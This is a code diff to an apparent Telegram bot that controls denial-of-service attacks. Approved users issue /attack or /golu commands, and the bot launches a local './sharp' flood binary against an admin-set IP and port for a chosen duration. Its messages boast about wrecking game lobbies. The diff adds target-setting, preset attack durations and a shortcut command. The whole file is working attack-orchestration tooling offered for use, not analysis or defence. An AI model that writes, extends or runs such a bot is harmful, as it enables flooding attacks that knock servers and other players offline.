@@ -11,6 +11,13 @@ attack_in_progress = False
 attack_paused = False
 attack_process = None
 
+# Default values
+DEFAULT_IP = '127.0.0.1'  # Initial default IP
+DEFAULT_PORT = '8080'      # Initial default Port
+
+# Predefined durations
+PREDEFINED_DURATIONS = [10, 60, 300, 600, 1000]
+
 def load_users():
     try:
         with open(USERS_FILE) as f:
@@ -24,14 +31,37 @@ def save_users(users):
 
 users = load_users()
 
+# To keep track of the current IP and Port
+current_ip = DEFAULT_IP
+current_port = DEFAULT_PORT
+
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
         "*🔥 Welcome to the SHARP PUBLIC🔥*\n\n"
         "*Use /attack <ip> <port> <duration>*\n"
+        "*Or use predefined commands: /golu 10, /golu 60, etc.*\n"
+        f"*Current settings: {current_ip}:{current_port}*\n"
         "*Let Start Fucking ⚔️💥*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+
+async def set_ip_port(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+
+    if chat_id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
+        return
+
+    args = context.args
+    if len(args) != 2:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /set <ip> <port>*", parse_mode='Markdown')
+        return
+
+    global current_ip, current_port
+    current_ip, current_port = args[0], args[1]
+    
+    await context.bot.send_message(chat_id=chat_id, text=f"*✔️ IP set to {current_ip}*\n*✔️ Port set to {current_port}*", parse_mode='Markdown')
 
 async def sharp(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
@@ -57,14 +87,14 @@ async def sharp(update: Update, context: CallbackContext):
         save_users(users)
         await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')
 
-async def run_attack(chat_id, ip, port, duration, context):
+async def run_attack(chat_id, duration, context):
     global attack_in_progress, attack_process
     attack_in_progress = True
 
     try:
         # Start the attack process
         attack_process = await asyncio.create_subprocess_shell(
-            f"./sharp {ip} {port} {duration}",
+            f"./sharp {current_ip} {current_port} {duration}",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -119,7 +149,37 @@ async def attack(update: Update, context: CallbackContext):
         f"*🔥 Enjoy And Fuck Whole Lobby  💥*"
     ), parse_mode='Markdown')
 
-    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
+    asyncio.create_task(run_attack(chat_id, duration, context))
+
+async def golu(update: Update, context: CallbackContext):
+    """Handles predefined duration attacks using /golu <duration> command."""
+    global attack_in_progress
+
+    chat_id = update.effective_chat.id
+    user_id = str(update.effective_user.id)
+    args = context.args
+
+    if user_id not in users:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
+        return
+
+    if attack_in_progress:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
+        return
+
+    if len(args) != 1 or not args[0].isdigit() or int(args[0]) not in PREDEFINED_DURATIONS:
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Usage: /golu <duration>*\n*Available durations: {', '.join(map(str, PREDEFINED_DURATIONS))}*", parse_mode='Markdown')
+        return
+
+    duration = args[0]
+    await context.bot.send_message(chat_id=chat_id, text=(
+        f"*⚔️ Predefined Attack Launched! ⚔️*\n"
+        f"*🎯 Target: {current_ip}:{current_port}*\n"
+        f"*🕒 Duration: {duration} seconds*\n"
+        f"*🔥 Enjoy And Fuck Whole Lobby  💥*"
+    ), parse_mode='Markdown')
+
+    asyncio.create_task(run_attack(chat_id, duration, context))
 
 async def handle_pause_resume(update: Update, context: CallbackContext):
     global attack_process, attack_paused
@@ -141,15 +201,16 @@ async def handle_pause_resume(update: Update, context: CallbackContext):
             attack_paused = False
             await context.bot.send_message(chat_id=chat_id, text="*▶️ Attack Resumed!*", parse_mode='Markdown')
         else:
-            await context.bot.send_message(chat_id=chat_id, text="*⚠️ No paused attack to resume.*", parse_mode='Markdown')
+            await context.bot.send_message(chat_id=chat_id, text="*⚠️ No paused attack to resume or it's already running.*", parse_mode='Markdown')
 
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("set", set_ip_port))
     application.add_handler(CommandHandler("sharp", sharp))
     application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(CommandHandler("golu", golu))
     application.add_handler(CallbackQueryHandler(handle_pause_resume))
-
     application.run_polling()
 
 if __name__ == '__main__':
